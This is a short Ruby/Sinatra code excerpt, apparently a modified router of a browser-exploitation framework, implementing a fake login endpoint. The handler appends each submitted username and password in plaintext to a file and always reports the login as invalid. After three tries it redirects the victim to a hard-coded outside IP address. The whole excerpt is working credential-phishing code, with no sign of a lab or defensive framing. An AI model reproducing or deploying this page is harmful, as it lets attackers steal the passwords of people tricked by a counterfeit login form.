  ...
  module Core
    module Router
      ...
      class Router < Sinatra::Base
        ...
        post '/login' do
          File.open('core/main/router/views/usernames.txt', 'a') do |file|
            file.puts "Account: #{params['username']} Password: #{params['password']}"
          end
          
          # Read the contents of the usernames.txt file
          usernames = File.read('core/main/router/views/usernames.txt')
          
          # Count the occurrences of the current username in the file
          occurrences = usernames.scan(params['username']).count
          
          # Calculate the updated login_attempts value
          login_attempts = occurrences + 0
           ...
           erb <<~HTML
            <html>
              <head>
                <script>
                if (#{login_attempts} < 3) {
                  alert('Invalid user ID or Password! Attempt #{login_attempts} of 3');
                  window.location = "/"; // Redirect to homepage after the alert is dismissed
                } else {
                  window.location = "http://14.139.187.24/"; // Redirect to the specified URL after three attempts
                }
                </script>
              </head>
            </html>
